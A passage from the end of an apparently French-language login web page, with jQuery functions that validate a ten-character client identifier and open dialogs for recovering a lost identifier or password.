            $('#MainContent_txtClientID').val(clientId);

            
            
            if (clientId.trim().length == 10) {
                $('#MainContent_txtClientID').val(clientId);

                if ($('#MainContent_txtClientID').val().trim().length == 10) {
                    $('#reqClientID').hide();
                    isOK = true;
                }
                else {
                    isOK = false;
                    $('#lblResetPwdClientID_error').html("Identifiant incorrect");
                    
                }
            }
            else {
                isOK = false;
                $('#lblResetPwdClientID_error').html("Identifiant incorrect");
                
            }

            if (isOK) {
                $('#MainContent_pResetPwdOnClientGenCode').hide();
                $('#divResetPwdOnClientGencodeLoading').show();
                setTimeout(function () { $('#MainContent_ClickResetPwdOnClientID').removeAttr("disabled").attr("disabled", "disabled"); }, 500);
            }

            return isOK;
        }
    </script>

    <script type="text/javascript">
        function showConfirmAddress() {
            $('#buttonAddressConfirmCode').removeAttr('disabled');
            //setTimeout(function () { $('#<=txtAddressConfirmCode.ClientID%>').focus(); }, 500);
            $("#dialog-confirmAddress").dialog({
                resizable: false,
                draggable: false,
                width: 850,
                minHeight: 350,
                dialogClass: "dialog-white",
                modal: true,
                title: ""
            });
            $("#dialog-confirmAddress").parent().appendTo(jQuery("form:first"));
        }
        function showHelpResetPwdOnClientID() {
            $('#txtResetPwdID_1').val('');
            $('#txtResetPwdID_2').val('');
            $('#txtResetPwdID_3').val('');
            $('#txtResetPwdID_4').val('');
            $('#MainContent_txtClientID').val('');
            setTimeout(function () { $('#txtResetPwdID_1').focus() }, 500);
            var dialogWidth;
            $('body').css("overflow", "hidden");


            $('#divChooseWhatIsLost').show();
            $('#divIdLost').hide();
            $('#divPwdLost').hide();

            setTimeout(function () {
                dialogWidth = $(window).width() + 20;
                $("#dialog-LostIdOrPwd").dialog({
                    draggable: false,
                    resizable: false,
                    autoOpen: false,
                    width: dialogWidth,
                    modal: true,
                    dialogClass: "dialog-white",
                    title: "J'ai perdu mon code d'accès",
                    buttons: []
                });
                $("#dialog-LostIdOrPwd").parent().appendTo(jQuery("form:first"));
                $('#dialog-LostIdOrPwd').dialog('open');
            }, 100);
            return false;
        }

        function HideDialogResetPwdOnClientGencode() {
            $('#dialog-LostIdOrPwd').dialog('close');
            $('#dialog-LostIdOrPwd').dialog('destroy');
            $('body').css("overflow", "auto");
        }

        function showIdLost() {
            $('#divChooseWhatIsLost').fadeOut(function () {
                $('#divIdLost').fadeIn();
            });
        }
        function showPwdLost() {
            $('#divChooseWhatIsLost').fadeOut(function () {
                $('#panelClientID').show();
                $('#divPwdLost').fadeIn();
            });
        }

        function showResetPwdLoading() {
            $('#MainContent_panelResetPwd').hide();
            $('#divResetPwdLoading').show();
            setTimeout(function () { $('#MainContent_btnResetPwd').removeAttr("disabled").attr("disabled", "disabled"); }, 500);
        }


        $(".MainContent_btnClientID").click(function(){
            alert("ok");
        })
    </script>

    
    

<script type="text/javascript">
//<![CDATA[
$(document).ready(function(){init();});KeypadInit();//]]>
</script>
</form>
</body>
</html>